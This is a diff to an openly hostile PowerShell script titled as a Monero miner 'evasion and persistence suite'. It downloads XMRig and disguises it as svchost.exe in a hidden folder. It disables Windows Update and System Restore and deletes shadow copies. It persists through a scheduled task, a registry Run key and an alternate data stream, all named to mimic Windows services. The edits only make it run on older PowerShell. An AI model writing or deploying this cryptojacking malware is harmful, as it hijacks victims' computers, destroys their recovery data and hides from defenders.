@@ -1,4 +1,5 @@
 # Monero miner deployment - full evasion and persistence suite
+# Compatible with older PowerShell (Windows PowerShell 5.1)
 # Run as Administrator
 
 $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
@@ -28,18 +29,26 @@ Set-Service wuauserv -StartupType Disabled -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" -Name "DisableSR" -Value 1 -Type DWord -Force
 vssadmin delete shadows /all /quiet 2>$null
 
-# 4. Create hidden directory
-if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force -Hidden }
+# 4. Create hidden directory (compatible method)
+if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force }
+Set-ItemProperty -Path $installPath -Name Attributes -Value "Hidden" -Force
 
 # 5. Download miner
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
 
 # 6. Extract archive
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
 
-# 7. Obfuscate executable name (rename to svchost.exe)
-Move-Item "$extractPath\xmrig.exe" $obfuscatedExe -Force
+# 7. Obfuscate executable name (rename to svchost.exe) – only if source exists
+$sourceExe = "$extractPath\xmrig.exe"
+if (Test-Path $sourceExe) {
+    Move-Item $sourceExe $obfuscatedExe -Force
+} else {
+    Write-Error "xmrig.exe not found after extraction. Aborting."
+    exit 1
+}
 
 # 8. Create config.json with CPU limiting (30% hint, yield, low priority)
 $config = @"
@@ -58,10 +67,14 @@ Start-Process -WindowStyle Hidden -FilePath "$obfuscatedExe" -ArgumentList "--co
 $launcherPath = "$installPath\launcher.ps1"
 $launcher | Out-File -FilePath $launcherPath -Encoding ascii
 
-# 10. Alternate data stream for launcher (fallback)
+# 10. Alternate data stream for launcher (fallback) – skip if not supported
 $adsPath = "$installPath\visible.txt"
-"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" | Out-File -FilePath $adsPath -Encoding ascii
-Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Get-Content '$adsPath' | Out-File '$installPath\visible.txt:run'`"" -WindowStyle Hidden
+try {
+    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" | Out-File -FilePath $adsPath -Encoding ascii
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Get-Content '$adsPath' | Out-File '$installPath\visible.txt:run'`"" -WindowStyle Hidden
+} catch {
+    # ADS not supported on some filesystems, ignore
+}
 
 # 11. Add firewall rule for miner
 New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Program $obfuscatedExe -Action Allow -Protocol TCP -LocalPort 5555 -ErrorAction SilentlyContinue
@@ -80,15 +93,15 @@ Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger
 # 14. Registry run key (fallback persistence)
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" -Force
 
-# 15. Hide directory + alternate data stream folder attribute
-attrib +s +h $installPath
+# 15. Hide directory again (in case attributes were reset)
+Set-ItemProperty -Path $installPath -Name Attributes -Value "Hidden" -Force
 
 # 16. Start miner immediately
 Start-Process -WindowStyle Hidden -FilePath $obfuscatedExe -ArgumentList "--config=$extractPath\config.json"
 
 # 17. Cleanup
-Remove-Item $zipPath -Force
-Remove-Item $adsPath -Force
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+Remove-Item $adsPath -Force -ErrorAction SilentlyContinue
 
 # 18. Print success message
 Write-Output "Ran successfully"
